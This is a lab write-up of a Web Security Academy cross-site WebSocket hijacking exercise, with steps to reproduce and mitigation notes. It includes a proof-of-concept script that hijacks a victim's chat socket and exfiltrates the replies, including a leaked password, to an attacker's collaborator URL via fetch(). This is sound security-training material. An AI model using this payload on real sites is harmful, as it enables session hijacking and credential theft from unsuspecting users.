## LAB 00: ****Cross-site Web-Socket hijacking****

### Overall

Right after you go to /chat page, the blog will response with a page with a form that will accept your input and then show it in the live chat. Inside the form will have an action that contain wss protocol.

Note for the handshake request appear loading when you go to /chat panel for live chatting, you may saw the request that response with 101 switching protocol mean switch from https to wss, start a tunnel for bi-directional communicate.

From here, switch to websocket panel will show you everything you communicate over wss.

And noted that the request above do not contain any mechanism to protect again CSRF which is mentioned in CSRF section.

### Step to reproduce

So, you are as a anonymous user, you may capture [this package](Web-Sockets%20083b2ed69fff4211942e46b5ff5c2361.md), you may want to perform a CSRF attack that target over the wss communication that are not protected by anything against CSRF like SameSite or CSRF tokens.

Then you can use the below POC code to conduct the attack target the vulnerable website.

POC:

```jsx
<script>
websocket = new WebSocket('wss://[ID].web-security-academy.net/chat') 
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
  websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
  //Exfiltrate the confidential information to attackers server
  fetch('https://[collab_url]/?'+event.data, {mode: 'no-cors'})
}
</script>
```

Noted that in the 1st line of the code, you must change the URL from https to wss for targeting the Websocket protocol.

This attack want to mimic the live chat function that the original page perform, but the attacker create a page in context that the user will click in and then perform the live chat with their session still appear, pretended that the user already login.

Then everything the user chat in the live chat will go through the Collaborator, in this case act as a place where the attacker can GET content from the page attacker created.

Then,you may see a content that talk about forgot password and then the admin return the password of carlos to him via live chat. This also expose the credential to us, act like the MitM.

### Mitigation

This type of attack is more like CSRF but in the context of websocket. So, to mitigate this type of attack, perform those mitigations that recommended in CSRF is necessary.

TLS over http or ws is always recommended.

TLS encryption, wss protocol, play over HTTP, bi—directional & full duplex. —> real time use cases 

- The `Connection` and `Upgrade` headers in the request and response indicate that this is a WebSocket handshake.
- The `Sec-WebSocket-Version` request header specifies the WebSocket protocol version that the client wishes to use.
- The `Sec-WebSocket-Key` request header contains a Base64-encoded random value, which should be randomly generated in each handshake request.
- The `Sec-WebSocket-Accept` response header contains a hash of the value submitted in the `Sec-WebSocket-Key` request header, concatenated with a specific string defined in the protocol specification. This is done to prevent misleading responses resulting from misconfigured servers or caching proxies.
